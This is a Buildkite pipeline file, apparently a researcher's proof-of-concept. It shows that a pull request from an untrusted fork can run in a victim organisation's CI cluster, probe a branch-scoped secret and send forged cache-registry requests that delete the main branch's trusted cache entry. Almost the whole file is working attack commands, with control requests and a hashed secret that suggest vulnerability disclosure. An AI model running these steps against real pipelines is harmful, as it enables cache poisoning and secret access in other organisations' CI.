# Outsider probe: `.buildkite/pipeline.yml` on branch `main` of the FORK
# ali-dev-test/bk-forktest, opened as PR #1 into ali-dev-test-2/bk-forktest:main.
# The fork author is NOT a member of the Buildkite organization and NOT a
# collaborator on the base repository. Buildkite checks out the pull request head,
# so these commands are the outsider's own code running in the victim org's cluster.
# `$$` is Buildkite's escape for a literal `$` at runtime (in-repo pipelines are
# interpolated at upload time).
steps:
  - label: ":fork: outsider fork-pr cache probe"
    agents:
      queue: cp-v4
    command: |
      set +e
      REG=forkpr-cache
      API="https://agent.buildkite.com/v3/cache_registries/$$REG"
      AUTH="Authorization: Token $$BUILDKITE_AGENT_ACCESS_TOKEN"
      J='Content-Type: application/json'
      ADDR='{"target_paths":["/tmp/fp"],"cache_key":[{"value":"fp-key","mandatory":true}]}'
      post() { curl -sS -X POST -H "$$AUTH" -H "$$J" -d "$$1" "$$API/$$2"; echo; }

      echo "=== [outsider] who is running this build ==="
      echo "BRANCH=[$$BUILDKITE_BRANCH] PIPELINE=[$$BUILDKITE_PIPELINE_SLUG] ORG=[$$BUILDKITE_ORGANIZATION_SLUG]"
      echo "PR=[$$BUILDKITE_PULL_REQUEST] BASE=[$$BUILDKITE_PULL_REQUEST_BASE_BRANCH] SOURCE=[$$BUILDKITE_SOURCE]"
      echo "AUTHOR=[$$BUILDKITE_BUILD_AUTHOR] CREATOR=[$$BUILDKITE_BUILD_CREATOR]"
      echo "HEAD=[$$(git rev-parse HEAD 2>/dev/null || echo NOCHECKOUT)]"
      echo "HEADFILE=[$$(head -c 44 .buildkite/pipeline.yml 2>/dev/null | tr '\n' ' ')]"

      echo "=== [outsider] cluster secret whose policy is pipeline fork-pr + branch main ==="
      if V=$$(buildkite-agent secret get FORKVALUE 2>/dev/null); then
        echo "SECRET_OK $$(printf %s "$$V" | sha256sum | cut -c1-16)"
      else
        echo "SECRET_DENIED"
      fi

      echo "=== [outsider] registry detail ==="
      curl -sS -H "$$AUTH" "$$API"; echo

      echo "=== [outsider] own retrieve: the server resolves this job's own branch ==="
      post "$$ADDR" retrieve

      echo "=== [outsider] forged retrieve naming branch main (control: must not return it) ==="
      post '{"target_paths":["/tmp/fp"],"cache_key":[{"value":"fp-key","mandatory":true}],"scopes":{"branch":"main"}}' retrieve

      echo "=== [outsider] control: expire naming this job's own scope ==="
      post "{\"target_paths\":[\"/tmp/fp\"],\"cache_key\":[{\"value\":\"fp-key\",\"mandatory\":true}],\"scopes\":{\"branch\":\"$$BUILDKITE_BRANCH\"}}" expire

      echo "=== [outsider] FORGED expire naming branch main: deletes the trusted entry ==="
      post '{"target_paths":["/tmp/fp"],"cache_key":[{"value":"fp-key","mandatory":true}],"scopes":{"branch":"main"}}' expire

      echo "=== [outsider] same request again: existed now reports false ==="
      post '{"target_paths":["/tmp/fp"],"cache_key":[{"value":"fp-key","mandatory":true}],"scopes":{"branch":"main"}}' expire

      echo "=== [outsider] done ==="
